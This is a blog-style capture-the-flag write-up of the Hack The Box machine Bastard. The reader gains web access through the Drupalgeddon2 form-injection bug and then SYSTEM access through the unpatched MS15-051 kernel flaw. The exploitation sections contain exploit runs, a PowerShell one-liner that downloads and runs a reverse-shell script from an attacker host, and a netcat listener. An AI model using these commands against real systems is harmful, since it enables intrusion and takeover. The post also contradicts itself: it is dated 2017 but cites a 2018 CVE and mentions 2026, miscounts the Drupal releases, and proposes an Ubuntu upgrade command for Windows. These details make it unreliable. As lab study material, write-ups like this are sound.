---
layout: post
title: "The Form That Built Itself"
subtitle: "HTB Bastard, where a registration form lets you draw the shape of its own code, and an unpatched kernel finishes the job"
date: 2017-09-23 12:00:00 +0000
description: "A Drupal form that trusts the names you give its fields, and a Windows kernel that never met a patch — two old doors, both wide open."
image: /assets/og/the-form-that-built-itself.png
tags: [hackthebox, writeup]
---

Bastard is a content management system that never learned to mind its own fields. The front page is a stock Drupal install, version 7.54, sitting one number behind the patch that mattered. Underneath that calm blue theme is a registration form that will let you describe the shape of its own internals, and once you can describe a thing in Drupal you can make it run. So you do not break the form. You fill it out. You hand it a field whose name is secretly a set of instructions, the form helpfully assembles those instructions into live code, and a shell falls out the back as the lowly web account. Then you look at the operating system underneath, a Windows Server 2008 R2 that has never met a patch, and the second half is just picking which old kernel hole to climb. The whole box is two doors left open by two different kinds of trust.

```
        B A S T A R D
        =============
        POST /user/register
        field name:  account][#post_render][]
                      |
        drupal reads the FIELD NAME as a
        render instruction and runs it
                      |
                      v
        whoami -> nt authority\iusr
        a low account on a kernel from 2009
                      |
        MS15-051 ----> nt authority\system
                                            形
```

## 0x01 · the three doors and the shut blinds

A full TCP sweep comes back almost rude in how little it offers. One web port and a pair of RPC ports, nothing else.

```
# nmap -sT -p- --min-rate 10000 -oA scans/alltcp 10.10.10.9
PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
```

IIS 7.5 puts us squarely on Windows Server 2008 R2, and the two RPC ports are just the back of that house. There is no SMB, no WinRM, no friendly second service to enumerate. Everything that happens on this box happens through port 80, which means the web application is not one of the doors. It is the only door, and the box is daring you to read it carefully.

The site identifies itself without much coaxing. The page source carries a Drupal generator tag, and the version is sitting in plain sight where Drupal always leaves it.

```
# curl -s http://10.10.10.9/CHANGELOG.txt | head -n 5
Drupal 7.54, 2017-02-01
-----------------------
- ...
```

A droopescan run confirms it and lists the modules that are along for the ride.

```
# droopescan scan drupal -u http://10.10.10.9
[+] Plugins found:
    ctools, libraries, services
[+] Possible version(s): 7.54
```

Drupal 7.54. One release behind 7.58. That single missing version is the whole game, because the patch that landed in between has a name people still say in a hushed voice.

## 0x02 · the field name that was a command

Drupalgeddon2 is CVE-2018-7600, and it is the kind of bug that makes you respect how dangerous a "convenience" can be. Drupal builds its pages out of nested arrays it calls render arrays. A render array is a little tree that describes what a chunk of the page should be, and any key in that tree starting with a `#` is not data, it is a directive. `#type`, `#markup`, and the dangerous one, `#post_render`, which names a function to call once the element has been built. The function named there gets run, with the arguments you provide, as part of drawing the page.

Here is the failure. On the user registration form, Drupal would take the field names you submitted and fold them straight into the render array without scrubbing out the `#` keys. So you do not submit a normal account field. You submit a field whose name is itself a tiny render instruction, something shaped like `account][#post_render][]`, and you pair it with a value that names a function to call and a command to feed it. Drupal reads the form, sees what it thinks is an internal directive, and obediently runs your function with your argument while it renders the response.

Think of it like a form at the bank where, instead of writing your name in the name box, you write the name box itself a new label, and the label says "manager, please open the vault." A normal teller treats the name box as a place for a name. Drupal treated the name of the box as an instruction it was allowed to follow. The data and the structure were never kept apart, so naming a field became programming the server.

The public exploit aims at exactly this. Point it at the registration endpoint and have it run a marker command first, to prove code runs before you trust it with anything bigger.

```
# ruby drupalgeddon2.rb http://10.10.10.9/
[*] --==[::#Drupalggedon2::]==--
[+] Found  : http://10.10.10.9/CHANGELOG.txt    (HTTP Response: 200)
[+] Target : 7.54
[*] Testing: Form   (user/register)
[+] Result : QJIXKRTWmv
[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hoooo!!!
```

That `[+] Result` line is the form printing back the output of a command you slipped into a field name. From here the exploit gives you a crude command runner over HTTP. Confirm who you are.

```
drupalgeddon2>> whoami
nt authority\iusr
```

`iusr` is the built-in identity IIS hands to anonymous web requests. It is about as low as a Windows account gets, which is exactly what you would expect from code that escaped out of a web form. To trade the awkward HTTP runner for a real shell, you stage a PowerShell one-liner that pulls a Nishang script and runs it in memory, calling back to a listener.

```
drupalgeddon2>> powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.4/iceberg.ps1')"
# iceberg.ps1 contains: [ powershell reverse shell calling back to 10.10.14.4 on 443 ]
```

Start the catcher, fire the request, and the box comes home.

```
# nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.9]
PS C:\inetpub\drupal-7.54> whoami
nt authority\iusr
PS C:\inetpub\drupal-7.54> type C:\Users\dimitris\Desktop\user.txt
████████████████████████████████
```

There is a second route the box also leaves open, the Drupal Services module with its own RCE, but it is the same lesson in a different organ. A web component treating attacker-supplied structure as trusted structure. Either way the door is the form.

## 0x03 · a kernel that never grew up

Now stand `iusr` up and look at the floor it is standing on. `systeminfo` tells a story that is almost cruel.

```
PS C:\> systeminfo
OS Name:        Microsoft Windows Server 2008 R2 Datacenter
OS Version:     6.1.7600 N/A Build 7600
Hotfix(s):      N/A
```

Build 7600 is the original 2009 release of 2008 R2, with no service pack and, per that last line, not a single hotfix ever applied. This is not a hardened server wearing a disguise. This is a machine that was installed, connected, and forgotten, and every kernel bug discovered in the last decade and change is still sitting inside it unmended.

When the patch level is zero, privilege escalation stops being detective work and becomes a menu. The clean pick here is MS15-051 (CVE-2015-1701), a flaw in `win32k.sys`, the part of the Windows kernel that handles windows and menus and other graphical bookkeeping. The bug lets a low user trick the kernel into running attacker-controlled code with kernel authority, and a compiled exploit wraps all of that into a single tool that runs a command of your choosing as SYSTEM.

Picture the kernel as the building's facilities manager, the only one with a master key to every room. MS15-051 is a forged work order slipped into his inbox that reads "go unlock room X and do whatever the person inside says." He has no way to tell the forgery from a real order, so he walks over, unlocks the room, and follows the instructions. The instructions are yours, and now they run with his keys.

Drop the prebuilt binary onto the box, point it at a test command, and read the answer.

```
PS C:\Users\Public> .\ms15-051x64.exe "whoami"
nt authority\system
```

The kernel just ran your command as itself. Swap the test command for a fresh reverse shell, or simply have it read the prize directly.

```
PS C:\Users\Public> .\ms15-051x64.exe "cmd /c type C:\Users\Administrator\Desktop\root.txt"
████████████████████████████████
```

No memory-corruption artistry on your end. The artistry was in the original exploit; your part was noticing that the box had never been patched against it and walking through the gap.

## 0x04 · the honest caveat

It is easy to file Bastard under "old box, two old CVEs, both fixed years ago," and the specific bugs absolutely are fixed. Nobody patient is shipping Drupal 7.54 or a hotfix-free 2008 R2 in 2026. But the two halves of this box are not really about Drupal or about Windows. They are about two failures that outlive every version number.

The first half is the failure of trusting structure you did not create. Drupalgeddon2 happened because a form let the names of its fields reach into the machinery and pull levers. That is the same disease as SQL injection, command injection, template injection, and every server-side request forgery, the identical confession every time. Somewhere a program took something a stranger supplied and treated part of it as an instruction instead of as inert data. The cure is not a single patch. It is the discipline of keeping the envelope and the contents of the envelope forever separate, so that no value a user submits can ever be promoted into code.

The second half is quieter and, honestly, scarier, because there is no clever bug in it at all. The privesc worked because the machine had never once been patched. A kernel exploit is a calendar problem. A `wsus` sync or a `do-release-upgrade` closes it forever, and any server with a patch policy that runs more than never would have shrugged the whole thing off. The exploit did not defeat the defenses. It found that the defenses were never installed. You cannot out-clever an unpatched box, and you do not have to, which is exactly why an unpatched box is the most common open door there is.

## 0x05 · outro

```
the form asked for your name.
you named a field after a command, and it could not tell the difference.
the floor underneath had not been patched since the day it shipped.

two doors, two kinds of trust. one let your data give orders.
the other just never locked.

separate the envelope from the letter. apply the update. wear black.

                                                            EOF
```

---

*HTB: Bastard, retired 26 May 2017. A medium Windows box that is really a lecture on render-array injection wearing a Drupal costume, finished off by a kernel that never grew up. The form still builds itself in a lab and nowhere you don't own.*